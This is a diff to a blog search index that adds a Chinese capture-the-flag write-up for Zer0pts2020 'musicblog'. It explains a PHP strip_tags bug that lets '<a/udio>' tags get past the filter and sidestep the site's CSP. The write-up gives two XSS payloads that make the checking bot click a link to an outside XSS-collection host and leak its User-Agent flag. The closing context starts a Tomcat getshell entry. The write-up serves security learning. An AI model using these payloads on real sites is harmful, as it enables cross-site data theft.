@@ -1,6 +1,57 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>[Zer0pts2020]musicblog</title>
+    <url>/2020/04/30/Zer0pts2020-musicblog/</url>
+    <content><![CDATA[<p>strip_tags()函数bug</p>
+<a id="more"></a>
+
+<p>题目给了源码，目录结构如下</p>
+<img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430231714733.png" alt="image-20200430231714733" style="zoom:200%;">
+
+<p>测试网站可以注册、登录、发布blog等。</p>
+<p>看worker.js源码</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// (snipped)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = <span class="string">'zer0pts&#123;&lt;censored&gt;&#125;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (snipped)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crawl = <span class="keyword">async</span> (url) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Query! (<span class="subst">$&#123;url&#125;</span>)`</span>);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.setUserAgent(flag);</span><br><span class="line">        <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">'networkidle0'</span>,</span><br><span class="line">            timeout: <span class="number">10</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">await</span> page.click(<span class="string">'#like'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Done! (<span class="subst">$&#123;url&#125;</span>)`</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (snipped)</span></span><br></pre></td></tr></table></figure>
+
+<p>这里crawl函数会将flag放到User-Agent中，导航到url，然后点击id为like的标签。所以可以确定为xss了。</p>
+<p>然后阅读源码，</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'util.php'</span>;</span><br><span class="line"></span><br><span class="line">$nonce = get_nonce();</span><br><span class="line">header(<span class="string">"Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'nonce-$&#123;nonce&#125;' 'strict-dynamic'; base-uri 'none'; trusted-types"</span>);</span><br><span class="line">header(<span class="string">'X-Frame-Options: DENY'</span>);</span><br><span class="line">header(<span class="string">'X-XSS-Protection: 1; mode=block'</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>
+
+<p>设置了csp，无法跨域请求，且js必须具有$nonce值才能被加载执行，然后寻找可以触发xss的地方，bot会点击id为like的标签，在访问post.php?id=xx时</p>
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430233401847.png" alt="image-20200430233401847"></p>
+<p>具有like的标签，可知bot会定时访问post.php页面，在post时</p>
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430233540707.png" alt="image-20200430233540707"></p>
+<p>会将<code>[[URL]]</code>转换成<code>&lt;audio src=&quot;URL&quot;&gt;&lt;/audio&gt;</code>,并且点击上图框中选项，bot会check your post,确定xss。</p>
+<p>然后看源码里对<code>[[URL]]</code>的处理，</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// [[URL]] → &lt;audio src="URL"&gt;&lt;/audio&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $str = preg_replace(<span class="string">'/\[\[(.+?)\]\]/'</span>, <span class="string">'&lt;audio controls src="\\1"&gt;&lt;/audio&gt;'</span>, $str);</span><br><span class="line">  $str = strip_tags($str, <span class="string">'&lt;audio&gt;'</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过查找资料可以找到strip_tags()函数有bug。</p>
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430233936071.png" alt="image-20200430233936071"></p>
+<p><a href="https://bugs.php.net/bug.php?id=78814" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78814</a></p>
+<p>也就是不会过滤<code>&lt;a/udio&gt;</code>，并且<code>&lt;a/udio&gt;</code>会作为 超链接<code>&lt;a&gt;</code>被解析，而超链接的跳转是不受<strong>CSP限制</strong>的。</p>
+<img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430234206184.png" alt="image-20200430234206184" style="zoom:200%;">
+
+<p>然后在post时将content设置为如下payload</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;a/udio  href=<span class="string">"http://xss.buuoj.cn/index.php?do=api&amp;id=UrvHLW"</span> id=like&gt;x&lt;<span class="regexp">/a/u</span>dio&gt;</span><br><span class="line">or</span><br><span class="line">[[<span class="string">"&gt;&lt;/audio&gt;&lt;a/udio href="</span>http:<span class="comment">//xss.buuoj.cn/index.php?do=api&amp;id=UrvHLW" id=like&gt;test&lt;/a/udio&gt;&lt;audio a="]]</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501000509269.png" alt="image-20200501000509269"></p>
+<p>可以看到已经添加了到xss平台的标签。</p>
+<ul>
+<li>第一个payload</li>
+</ul>
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501000449539.png" alt="image-20200501000449539"></p>
+<ul>
+<li>第二个payload</li>
+</ul>
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430235654042.png" alt="image-20200430235654042"></p>
+<p>然后可得flag。</p>
+<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430235007637.png" alt="image-20200430235007637"></p>
+]]></content>
+      <tags>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>[WUSTCTF2020]Train Yourself To Be Godly</title>
     <url>/2020/04/28/WUSTCTF2020-Train-Yourself-To-Be-Godly/</url>
     <content><![CDATA[<p>Tomcat目录穿越+弱口令+getshell</p>
